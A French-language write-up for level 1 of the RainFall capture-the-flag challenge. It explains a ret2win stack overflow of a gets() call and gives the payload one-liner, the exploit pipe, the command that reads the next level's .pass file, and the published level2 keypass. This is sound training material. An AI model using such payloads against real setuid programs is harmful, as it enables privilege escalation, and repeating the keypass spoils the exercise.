# RainFall - Level 1

## Keypass for level2
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

## Objectif

Exploiter le binaire `level1` (setuid level2) afin d'obtenir un shell et lire le fichier `/home/user/level2/.pass`.

---

## Analyse du binaire

### Source approximative

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void run(void)
{
    write(1, "Good... oh wait!\n", 17);
    execl("/bin/sh", "sh", NULL);
}

int main(void)
{
    char buff[76];

    gets(buff);
    return 0;
}
```

### Points clés

- Buffer de **76 octets**
- `gets()` → buffer overflow possible
- Présence d'une fonction `run()` qui lance un shell (`/bin/sh`)
- Aucun filtre ni protection particulière (pas de canary, pas de NX bloquant dans ce niveau)

### Problème

Le programme lit une entrée utilisateur dans un buffer de taille fixe sans vérification de longueur.
Il est possible d'écraser l'adresse de retour de `main` pour rediriger l'exécution vers la fonction `run`.

---

## Solution : Retour vers la fonction `run`

### Idée

1. Trouver l'adresse de la fonction `run`
2. Écraser l'adresse de retour avec cette adresse
3. Le programme saute dans `run` → shell obtenu

### Recherche de l'adresse de `run`

```bash
objdump -d level1 | grep -A5 "<run>"
```

ou dans GDB :

```gdb
disas run
```

Adresse typique :

```
0x08048444
```

(à vérifier sur le binaire réel)

### Calcul de l'offset

- Buffer : 76 octets
- Saved EBP : 4 octets
- Adresse de retour : 4 octets

→ **80 octets** de padding avant l'adresse de retour.

---

## Construction du payload

```bash
python -c 'print "A"*80 + "\x44\x84\x04\x08"' > /tmp/payload
```

Remplacer `\x44\x84\x04\x08` par l'adresse réelle de `run` en little-endian.

### Vérification de la taille

```bash
wc -c /tmp/payload
# doit afficher 84
```

---

## Exploitation

```bash
(cat /tmp/payload; cat) | ./level1
```

Une fois le shell obtenu :

```bash
id
cat /home/user/level2/.pass
```

---

## Vérification sous GDB

```gdb
gdb ./level1
(gdb) b *main
(gdb) run < /tmp/payload
(gdb) disas run                  # confirmer l'adresse
(gdb) x/wx $ebp+4                # vérifier que l'adresse de retour a bien été écrasée
(gdb) c
```

---

## Résumé de la technique

| Étape | Description |
|-------|-------------|
| 1 | Overflow du buffer via `gets` |
| 2 | Padding de 80 octets pour atteindre l'adresse de retour |
| 3 | Écrasement de l'adresse de retour avec l'adresse de `run` |
| 4 | Le programme saute dans `run` → shell |

Cette technique est un **retour vers une fonction existante** (ret2text / ret2win).
